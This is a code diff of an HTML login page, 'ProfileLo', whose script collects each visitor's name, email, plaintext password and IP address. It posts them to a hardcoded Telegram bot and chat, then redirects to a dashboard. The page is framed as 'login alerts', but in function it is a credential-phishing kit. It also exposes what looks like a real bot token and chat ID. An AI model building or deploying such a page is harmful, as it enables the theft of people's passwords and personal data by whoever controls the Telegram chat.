@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ProfileLo Login — Telegram Alerts Active</title>
+<title>ProfileLo Login</title>
 
 <style>
 * {
@@ -12,32 +12,27 @@
   box-sizing: border-box;
 }
 
-body{
-  margin:0;
-  font-family: 'Segoe UI', 'Arial', system-ui, sans-serif;
-  height:100vh;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  background:linear-gradient(135deg, #0f172a, #1e293b);
-  color:white;
+body {
+  font-family: 'Segoe UI', Arial, sans-serif;
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background: linear-gradient(135deg, #0f172a, #1e293b);
+  color: white;
 }
 
-.box{
-  width:340px;
-  padding:28px 24px;
-  background:rgba(255,255,255,0.08);
-  backdrop-filter:blur(12px);
-  border-radius:28px;
-  border:1px solid rgba(255,255,255,0.15);
-  box-shadow: 0 20px 35px -12px rgba(0,0,0,0.3);
-  text-align:center;
-  transition: all 0.2s ease;
+.login-box {
+  width: 340px;
+  padding: 28px 24px;
+  background: rgba(255,255,255,0.08);
+  backdrop-filter: blur(12px);
+  border-radius: 28px;
+  border: 1px solid rgba(255,255,255,0.15);
+  text-align: center;
 }
 
 h2 {
-  font-weight: 600;
-  letter-spacing: -0.3px;
   margin-bottom: 20px;
   font-size: 1.8rem;
   background: linear-gradient(120deg, #f0f9ff, #bae6fd);
@@ -46,17 +41,16 @@ h2 {
   color: transparent;
 }
 
-input{
-  width:100%;
-  padding:12px 14px;
-  margin:10px 0;
-  border:none;
-  border-radius:60px;
-  outline:none;
+input {
+  width: 100%;
+  padding: 12px 14px;
+  margin: 10px 0;
+  border: none;
+  border-radius: 60px;
+  outline: none;
   font-size: 0.95rem;
   background: rgba(255,255,255,0.9);
   color: #0f172a;
-  transition: 0.2s;
 }
 
 input:focus {
@@ -64,82 +58,22 @@ input:focus {
   box-shadow: 0 0 0 3px rgba(56,189,248,0.4);
 }
 
-button{
-  width:100%;
-  padding:12px;
-  margin-top:18px;
-  border:none;
-  border-radius:60px;
-  background:#38bdf8;
-  font-weight:bold;
-  font-size: 1rem;
-  color:#0c0f1c;
-  cursor:pointer;
-  transition: 0.2s;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-}
-
-button:hover{
-  background:#0ea5e9;
-  transform: scale(0.98);
-}
-
-.profile{
-  display:none;
-}
-
-.avatar{
-  width:90px;
-  height:90px;
-  border-radius:50%;
-  background: linear-gradient(145deg, #38bdf8, #0284c7);
-  margin:10px auto 18px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-size:38px;
-  color:white;
-  font-weight:bold;
-  box-shadow: 0 10px 20px -5px rgba(0,0,0,0.3);
-  border: 2px solid rgba(255,255,255,0.3);
-}
-
-#pname {
-  font-size: 1.6rem;
-  margin-bottom: 6px;
-  word-break: break-word;
-}
-
-#pemail {
-  color: #cbd5e1;
-  margin-bottom: 28px;
-  font-size: 0.9rem;
-}
-
-.logout-btn {
-  background: rgba(255,255,255,0.2);
-  backdrop-filter: blur(4px);
-  color: white;
-  border: 1px solid rgba(255,255,255,0.3);
-}
-
-.logout-btn:hover {
-  background: rgba(220,38,38,0.8);
-}
-
-.status-msg {
-  font-size: 0.75rem;
-  margin-top: 12px;
-  color: #facc15;
-  background: rgba(0,0,0,0.4);
+button {
+  width: 100%;
+  padding: 12px;
+  margin-top: 18px;
+  border: none;
   border-radius: 60px;
-  padding: 5px 10px;
-  display: inline-block;
+  background: #38bdf8;
+  font-weight: bold;
+  font-size: 1rem;
+  cursor: pointer;
+  transition: 0.2s;
 }
 
-.field-group {
-  position: relative;
-  text-align: left;
+button:hover {
+  background: #0ea5e9;
+  transform: scale(0.98);
 }
 
 .password-wrapper {
@@ -158,8 +92,6 @@ button:hover{
   color: #334155;
   width: auto;
   padding: 0;
-  margin: 0;
-  box-shadow: none;
 }
 
 small {
@@ -170,16 +102,47 @@ small {
   margin: 4px 0 0 12px;
 }
 
-.error-shake {
-  animation: shake 0.2s ease-in-out 0s 2;
-  border: 1px solid #f87171 !important;
-  background: #fff0f0;
+.error-msg {
+  font-size: 0.75rem;
+  margin-top: 12px;
+  color: #facc15;
+  background: rgba(0,0,0,0.4);
+  border-radius: 60px;
+  padding: 5px 10px;
+  display: inline-block;
 }
 
-@keyframes shake {
-  0%,100% { transform: translateX(0); }
-  25% { transform: translateX(-4px); }
-  75% { transform: translateX(4px); }
+.status-led {
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  display: inline-block;
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: #ef4444;
+  box-shadow: 0 0 5px #ef4444;
+  animation: pulse 2s infinite;
+}
+
+.status-led.active {
+  background: #10b981;
+  box-shadow: 0 0 5px #10b981;
+}
+
+@keyframes pulse {
+  0% { opacity: 0.5; transform: scale(1); }
+  50% { opacity: 1; transform: scale(1.2); }
+  100% { opacity: 0.5; transform: scale(1); }
+}
+
+.status-text {
+  position: fixed;
+  top: 18px;
+  right: 35px;
+  font-size: 11px;
+  color: #94a3b8;
+  font-family: monospace;
 }
 
 .toast {
@@ -187,195 +150,176 @@ small {
   bottom: 20px;
   right: 20px;
   background: #1e293b;
-  color: white;
-  padding: 12px 20px;
-  border-radius: 12px;
-  font-size: 13px;
-  font-weight: 500;
+  padding: 10px 16px;
+  border-radius: 8px;
+  font-size: 12px;
   z-index: 1000;
   opacity: 0;
-  transform: translateY(20px);
-  transition: all 0.3s ease;
-  pointer-events: none;
-  border-left: 4px solid #38bdf8;
-  max-width: 300px;
-  box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+  transition: opacity 0.3s;
+  border-left: 3px solid #38bdf8;
 }
 
-.toast.show {
-  opacity: 1;
-  transform: translateY(0);
-}
-
-.toast.error {
-  border-left-color: #ef4444;
-}
-
-.config-panel {
-  position: fixed;
-  top: 20px;
-  right: 20px;
-  background: rgba(0,0,0,0.7);
-  backdrop-filter: blur(8px);
-  padding: 12px 16px;
-  border-radius: 12px;
-  font-size: 11px;
-  font-family: monospace;
-  z-index: 999;
-  border: 1px solid rgba(255,255,255,0.2);
-  cursor: pointer;
-}
-
-.config-panel:hover {
-  background: rgba(0,0,0,0.9);
-}
-
-.status-led {
-  display: inline-block;
-  width: 8px;
-  height: 8px;
-  border-radius: 50%;
-  margin-right: 6px;
-}
-
-.status-led.off {
-  background: #ef4444;
-  box-shadow: 0 0 4px #ef4444;
-}
-
-.status-led.on {
-  background: #10b981;
-  box-shadow: 0 0 4px #10b981;
-}
+.toast.show { opacity: 1; }
 </style>
 </head>
-
 <body>
 
-<div class="config-panel" id="configPanel" onclick="showConfigModal()">
-  <span class="status-led off" id="telegramStatusLed"></span>
-  <span id="telegramStatusText">⚙️ Config</span>
-</div>
+<div class="status-led" id="statusLed"></div>
+<div class="status-text" id="statusText">● Checking Telegram...</div>
 
-<div class="box" id="loginBox">
+<div class="login-box">
   <h2>🔐 ProfileLo</h2>
   
-  <div class="field-group">
-    <input type="text" id="name" placeholder="Full name" autocomplete="name">
-  </div>
+  <input type="text" id="name" placeholder="Full name">
+  <input type="email" id="email" placeholder="Email address">
   
-  <div class="field-group">
-    <input type="email" id="email" placeholder="Email address" autocomplete="email">
-  </div>
-  
-  <div class="field-group password-wrapper">
-    <input type="password" id="pass" placeholder="Password" autocomplete="current-password">
+  <div class="password-wrapper">
+    <input type="password" id="pass" placeholder="Password">
     <button type="button" class="toggle-pw" id="togglePassBtn">👁️</button>
   </div>
   
   <small>🔒 Password must be at least 4 characters</small>
   <button onclick="login()">✨ Login →</button>
-  <div id="loginErrorMsg" class="status-msg" style="display: none;"></div>
-</div>
-
-<div class="box profile" id="profileBox">
-  <div class="avatar" id="avatar">U</div>
-  <h2 id="pname"></h2>
-  <p id="pemail"></p>
-  <button class="logout-btn" onclick="logout()">🚪 Logout</button>
+  <div id="errorMsg" class="error-msg" style="display: none;"></div>
 </div>
 
 <div id="toastMsg" class="toast"></div>
 
 <script>
 // ============================================================
-// 🔐 TELEGRAM CONFIGURATION - EDIT THESE TWO VALUES!
+// 🔐 TELEGRAM CONFIGURATION - REPLACE WITH YOUR VALUES!
 // ============================================================
-// STEP 1: Create a bot on Telegram via @BotFather
-// STEP 2: Get your bot token (looks like: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz)
-// STEP 3: Get your chat ID (send message to bot, then visit:
-//         https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates)
+// HOW TO GET:
+// 1. Talk to @BotFather on Telegram → create bot → get token
+// 2. Message your bot, then visit:
+//    https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates
+// 3. Copy your chat ID
 // ============================================================
 
-let botToken = "8507706742:AAFgZhWiOsCBfsL6wJORQUy7xabov-Wor3o";  // <--- PASTE YOUR BOT TOKEN HERE
-let chatId = "778298958";     // <--- PASTE YOUR CHAT ID HERE
-
-// For demo/testing - you can also set these via browser console
-// Just type: setTelegramConfig("YOUR_TOKEN", "YOUR_CHAT_ID")
+const BOT_TOKEN = "8507706742:AAFgZhWiOsCBfsL6wJORQUy7xabov-Wor3o";  // ← PASTE YOUR BOT TOKEN
+const CHAT_ID = "778298958";      // ← PASTE YOUR CHAT ID
 
 // ============================================================
 
-function showToast(message, isError = false) {
+function showToast(msg, isError = false) {
   const toast = document.getElementById("toastMsg");
-  toast.textContent = message;
-  toast.className = isError ? "toast error show" : "toast show";
-  setTimeout(() => {
-    toast.classList.remove("show");
-  }, 4000);
+  toast.textContent = msg;
+  toast.style.borderLeftColor = isError ? "#ef4444" : "#38bdf8";
+  toast.classList.add("show");
+  setTimeout(() => toast.classList.remove("show"), 4000);
 }
 
-function showLoginError(message) {
-  const errorDiv = document.getElementById("loginErrorMsg");
-  errorDiv.innerText = message;
-  errorDiv.style.display = "block";
-  setTimeout(() => {
-    if (errorDiv) errorDiv.style.display = "none";
-  }, 2800);
-}
-
-function shakeField(fieldElement) {
-  if (!fieldElement) return;
-  fieldElement.classList.add("error-shake");
-  setTimeout(() => {
-    fieldElement.classList.remove("error-shake");
-  }, 400);
-}
-
-// Update Telegram status indicator
-function updateTelegramStatus() {
-  const led = document.getElementById("telegramStatusLed");
-  const statusText = document.getElementById("telegramStatusText");
+function updateTelegramStatus(isWorking) {
+  const led = document.getElementById("statusLed");
+  const text = document.getElementById("statusText");
   
-  if (botToken && botToken.length > 10 && chatId && chatId.length > 3) {
-    led.className = "status-led on";
-    statusText.innerHTML = "✅ Telegram Ready";
+  if (isWorking) {
+    led.className = "status-led active";
+    text.innerHTML = "● Telegram Active";
+    text.style.color = "#10b981";
   } else {
-    led.className = "status-led off";
-    statusText.innerHTML = "⚙️ Set Token & Chat ID";
+    led.className = "status-led";
+    text.innerHTML = "⚠️ Telegram Not Configured";
+    text.style.color = "#ef4444";
   }
 }
 
-// Send to Telegram with proper error handling
-async function sendTelegram(name, email, password) {
-  // Check if config is set
-  if (!botToken || botToken.length < 20 || !chatId || chatId.length < 3) {
-    console.warn("⚠️ Telegram not configured. Please set botToken and chatId");
-    showToast("⚠️ Telegram not configured! Click the config panel in top-right to set your bot token & chat ID", true);
+// Test Telegram connection on page load
+async function testTelegramConnection() {
+  if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !CHAT_ID || CHAT_ID === "YOUR_CHAT_ID_HERE") {
+    console.warn("⚠️ Telegram not configured");
+    updateTelegramStatus(false);
+    showToast("⚠️ Please configure Telegram Bot Token and Chat ID in the code", true);
     return false;
   }
+  
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+    const result = await response.json();
+    
+    if (result.ok) {
+      console.log("✅ Telegram bot connected:", result.result.username);
+      updateTelegramStatus(true);
+      showToast("✅ Telegram bot is ready!");
+      return true;
+    } else {
+      console.error("❌ Invalid bot token");
+      updateTelegramStatus(false);
+      showToast("❌ Invalid Telegram Bot Token", true);
+      return false;
+    }
+  } catch (error) {
+    console.error("❌ Cannot connect to Telegram:", error);
+    updateTelegramStatus(false);
+    showToast("❌ Cannot connect to Telegram API", true);
+    return false;
+  }
+}
 
-  const msg = `🔐 *NEW LOGIN ALERT*  
-━━━━━━━━━━━━━━━━
+async function getClientIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+  } catch(e) {
+    return "Unable to detect";
+  }
+}
+
+// Send login notification to Telegram
+async function sendTelegramLogin(name, email, password) {
+  // Check if configured
+  if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+    console.error("❌ Bot token not configured");
+    showToast("❌ Telegram not configured - Set BOT_TOKEN and CHAT_ID in code", true);
+    return false;
+  }
+  
+  const now = new Date();
+  const loginTime = now.toLocaleString('en-US', {
+    weekday: 'long',
+    year: 'numeric',
+    month: 'long',
+    day: 'numeric',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    timeZoneName: 'short'
+  });
+  
+  const timestamp = now.getTime();
+  const dateISO = now.toISOString();
+  const ip = await getClientIP();
+
+  const message = `🔐 *NEW LOGIN ALERT*  
+━━━━━━━━━━━━━━━━━━━━━━━
 👤 *Name:* ${name}
 📧 *Email:* ${email}
 🔑 *Password:* ${password}
-⏰ *Time:* ${new Date().toLocaleString()}
-━━━━━━━━━━━━━━━━`;
+⏰ *Login Time:* ${loginTime}
+📅 *Date (ISO):* ${dateISO}
+🕐 *Timestamp:* ${timestamp}
+🌐 *IP Address:* ${ip}
+━━━━━━━━━━━━━━━━━━━━━━━
+✅ *Status:* Login Successful`;
 
   console.log("📤 Sending to Telegram...");
-  console.log("Bot Token:", botToken.substring(0, 10) + "...");
-  console.log("Chat ID:", chatId);
+  console.log("Bot Token:", BOT_TOKEN.substring(0, 15) + "...");
+  console.log("Chat ID:", CHAT_ID);
+  console.log("Message length:", message.length);
   
   try {
-    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     console.log("API URL:", apiUrl);
     
     const response = await fetch(apiUrl, {
       method: "POST",
-      headers: {"Content-Type": "application/json"},
+      headers: {
+        "Content-Type": "application/json",
+      },
       body: JSON.stringify({
-        chat_id: chatId,
-        text: msg,
+        chat_id: CHAT_ID,
+        text: message,
         parse_mode: "Markdown"
       })
     });
@@ -385,200 +329,114 @@ async function sendTelegram(name, email, password) {
     
     if (result.ok) {
       console.log("✅ Telegram notification sent successfully!");
-      showToast("✅ Telegram notification sent!");
+      showToast("✅ Login notification sent to Telegram!");
       return true;
     } else {
       console.error("❌ Telegram API error:", result.description);
       showToast(`❌ Telegram error: ${result.description}`, true);
       return false;
     }
-  } catch (err) {
-    console.error("❌ Network error:", err);
-    showToast(`❌ Network error: ${err.message}`, true);
+  } catch (error) {
+    console.error("❌ Network error:", error);
+    showToast(`❌ Network error: ${error.message}`, true);
     return false;
   }
 }
 
-// Function to set config from browser console or modal
-window.setTelegramConfig = function(token, chatid) {
-  botToken = token;
-  chatId = chatid;
-  updateTelegramStatus();
-  showToast("✅ Telegram config updated!");
-  console.log("New config - Token:", token.substring(0, 15)+"...", "Chat ID:", chatid);
-  
-  // Test the connection
-  testTelegramConnection();
-};
-
-async function testTelegramConnection() {
-  if (!botToken || !chatId) return;
-  
-  showToast("🔍 Testing Telegram connection...");
-  try {
-    const response = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
-    const result = await response.json();
-    if (result.ok) {
-      showToast(`✅ Bot connected: @${result.result.username}`);
-    } else {
-      showToast("❌ Invalid bot token", true);
-    }
-  } catch(e) {
-    showToast("❌ Cannot connect to Telegram", true);
-  }
-}
-
-function showConfigModal() {
-  const token = prompt("📱 Enter your Telegram Bot Token:\n(Get from @BotFather on Telegram)", botToken || "");
-  if (token && token.length > 10) {
-    const chatid = prompt("💬 Enter your Chat ID:\n(Send a message to your bot, then check /getUpdates)", chatId || "");
-    if (chatid && chatid.length > 2) {
-      setTelegramConfig(token, chatid);
-    } else {
-      showToast("❌ Chat ID is required", true);
-    }
-  } else if (token !== null) {
-    showToast("❌ Valid bot token required (min 20 chars)", true);
-  }
-}
-
-function login() {
+async function login() {
   const nameInput = document.getElementById("name");
   const emailInput = document.getElementById("email");
   const passInput = document.getElementById("pass");
   
-  let name = nameInput.value.trim();
-  let email = emailInput.value.trim();
-  let password = passInput.value;
+  const name = nameInput.value.trim();
+  const email = emailInput.value.trim();
+  const password = passInput.value;
+  const errorDiv = document.getElementById("errorMsg");
   
-  console.log("Login attempt - Name:", name, "Email:", email, "Password length:", password ? password.length : 0);
+  errorDiv.style.display = "none";
   
-  document.getElementById("loginErrorMsg").style.display = "none";
-  
-  let isValid = true;
-  
+  // Validation
   if (!name || name.length < 2) {
-    showLoginError("❌ Name must be at least 2 characters.");
-    shakeField(nameInput);
-    isValid = false;
+    errorDiv.innerText = "❌ Name must be at least 2 characters";
+    errorDiv.style.display = "block";
+    return;
   }
   
   const emailPattern = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
   if (!email || !emailPattern.test(email)) {
-    showLoginError("📧 Please provide a valid email address.");
-    shakeField(emailInput);
-    isValid = false;
+    errorDiv.innerText = "❌ Valid email required";
+    errorDiv.style.display = "block";
+    return;
   }
   
   if (!password || password.length < 4) {
-    showLoginError("🔑 Password must be at least 4 characters.");
-    shakeField(passInput);
-    isValid = false;
+    errorDiv.innerText = "❌ Password must be at least 4 characters";
+    errorDiv.style.display = "block";
+    return;
   }
   
-  if (!isValid) return;
+  // Save login info
+  const loginTimestamp = new Date().toISOString();
+  localStorage.setItem("lastLoginTime", loginTimestamp);
   
-  // Send to Telegram
-  sendTelegram(name, email, password);
+  let loginCount = parseInt(localStorage.getItem("loginCount") || "0");
+  loginCount++;
+  localStorage.setItem("loginCount", loginCount);
   
-  localStorage.setItem("name", name);
-  localStorage.setItem("email", email);
-  
-  showProfile();
-}
-
-function showProfile() {
-  document.getElementById("loginBox").style.display = "none";
-  document.getElementById("profileBox").style.display = "block";
-  
-  let name = localStorage.getItem("name") || "Guest";
-  let email = localStorage.getItem("email") || "no-reply@example.com";
-  
-  document.getElementById("pname").innerText = name;
-  document.getElementById("pemail").innerText = email;
-  document.getElementById("avatar").innerText = name.charAt(0).toUpperCase();
-}
-
-function logout() {
-  localStorage.clear();
-  document.getElementById("loginBox").style.display = "block";
-  document.getElementById("profileBox").style.display = "none";
-  document.getElementById("name").value = "";
-  document.getElementById("email").value = "";
-  document.getElementById("pass").value = "";
-  showToast("Logged out");
-}
-
-function initPasswordToggle() {
-  const toggleBtn = document.getElementById("togglePassBtn");
-  const passInput = document.getElementById("pass");
-  if (toggleBtn && passInput) {
-    toggleBtn.addEventListener("click", (e) => {
-      e.preventDefault();
-      const type = passInput.type === "password" ? "text" : "password";
-      passInput.type = type;
-      toggleBtn.textContent = type === "password" ? "👁️" : "🙈";
-    });
-  }
-}
-
-function bindEnterKey() {
-  ["name", "email", "pass"].forEach(id => {
-    const el = document.getElementById(id);
-    if (el) {
-      el.addEventListener("keypress", (e) => {
-        if (e.key === "Enter") login();
-      });
-    }
-  });
-}
-
-window.addEventListener("DOMContentLoaded", () => {
-  initPasswordToggle();
-  bindEnterKey();
-  updateTelegramStatus();
-  
-  if (localStorage.getItem("name")) {
-    showProfile();
+  let firstLogin = localStorage.getItem("firstLogin");
+  if (!firstLogin) {
+    localStorage.setItem("firstLogin", loginTimestamp);
   }
   
-  // Load saved config from localStorage
-  const savedToken = localStorage.getItem("telegram_bot_token");
-  const savedChatId = localStorage.getItem("telegram_chat_id");
-  if (savedToken && savedChatId) {
-    botToken = savedToken;
-    chatId = savedChatId;
-    updateTelegramStatus();
+  // Send Telegram notification (THIS IS THE FIXED PART)
+  showToast("📤 Sending Telegram notification...");
+  const telegramSent = await sendTelegramLogin(name, email, password);
+  
+  if (telegramSent) {
+    console.log("✅ Telegram notification sent at:", new Date().toLocaleString());
+  } else {
+    console.warn("⚠️ Telegram notification failed, but login continues");
   }
+  
+  // Save user data
+  localStorage.setItem("userName", name);
+  localStorage.setItem("userEmail", email);
+  localStorage.setItem("isLoggedIn", "true");
+  
+  // Redirect to dashboard
+  setTimeout(() => {
+    window.location.href = "dashboard.html";
+  }, 1500);
+}
+
+// Check if already logged in
+if (localStorage.getItem("isLoggedIn") === "true") {
+  window.location.href = "dashboard.html";
+}
+
+// Password toggle
+document.getElementById("togglePassBtn")?.addEventListener("click", () => {
+  const pass = document.getElementById("pass");
+  pass.type = pass.type === "password" ? "text" : "password";
 });
 
-// Save config to localStorage when set
-const originalSetConfig = window.setTelegramConfig;
-window.setTelegramConfig = function(token, chatid) {
-  botToken = token;
-  chatId = chatid;
-  localStorage.setItem("telegram_bot_token", token);
-  localStorage.setItem("telegram_chat_id", chatid);
-  updateTelegramStatus();
-  originalSetConfig(token, chatid);
-};
+// Enter key support
+document.getElementById("pass")?.addEventListener("keypress", (e) => {
+  if (e.key === "Enter") login();
+});
 
-window.login = login;
-window.logout = logout;
-</script>
+// Test connection on page load
+testTelegramConnection();
 
-<!-- Instructions displayed on console -->
-<script>
-console.log("%c📱 TELEGRAM SETUP INSTRUCTIONS:", "color: #38bdf8; font-size: 16px; font-weight: bold");
-console.log("%c1. Open Telegram and search for @BotFather", "color: #94a3b8");
-console.log("%c2. Send /newbot and follow instructions to create a bot", "color: #94a3b8");
-console.log("%c3. Copy the bot token (looks like: 123456:ABCdefGHIJK)", "color: #94a3b8");
-console.log("%c4. Send a message to your new bot", "color: #94a3b8");
+// Instructions in console
+console.log("%c📱 TELEGRAM SETUP INSTRUCTIONS:", "color: #38bdf8; font-size: 14px; font-weight: bold");
+console.log("%c1. Open Telegram → Search @BotFather", "color: #94a3b8");
+console.log("%c2. Send /newbot → Create your bot", "color: #94a3b8");
+console.log("%c3. Copy the bot token", "color: #94a3b8");
+console.log("%c4. Message your bot (say 'Hello')", "color: #94a3b8");
 console.log("%c5. Visit: https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates", "color: #94a3b8");
-console.log("%c6. Copy your chat ID from the response", "color: #94a3b8");
-console.log("%c7. Click the config panel in top-right and paste both values", "color: #94a3b8");
-console.log("%c━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "color: #38bdf8");
-console.log("%cQuick test command: setTelegramConfig('YOUR_TOKEN', 'YOUR_CHAT_ID')", "color: #facc15");
+console.log("%c6. Copy your chat ID number", "color: #94a3b8");
+console.log("%c7. Replace BOT_TOKEN and CHAT_ID in the code", "color: #94a3b8");
 </script>
 </body>
 </html>
